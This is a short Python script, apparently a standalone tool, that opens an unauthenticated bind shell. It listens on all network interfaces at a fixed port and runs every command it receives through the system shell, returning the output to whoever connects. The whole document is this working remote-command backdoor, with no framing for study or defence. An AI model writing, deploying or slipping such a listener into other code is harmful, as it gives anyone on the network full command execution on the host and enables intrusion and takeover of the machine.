import socket
import subprocess

HOST = '0.0.0.0'
PORT = 26574

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(1)
    print(f"[+] Listening on port {PORT} (Waiting for command sender)")

    conn, addr = server.accept()
    print(f"[+] Connected by {addr}")

    try:
        while True:
            data = conn.recv(4096)
            if not data:
                break

            cmd = data.decode()
            if cmd.strip().lower() == 'exit':
                print("[+] Exit command received, closing.")
                break

            try:
                output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
            except subprocess.CalledProcessError as e:
                # e.output이 None일 수 있으니 대비
                output = e.output if e.output else b"[ERROR] Command failed with no output."

            if not output:
                output = b"[INFO] Command executed but no output."

            conn.sendall(output)
    finally:
        conn.close()
        server.close()

if __name__ == "__main__":
    main()
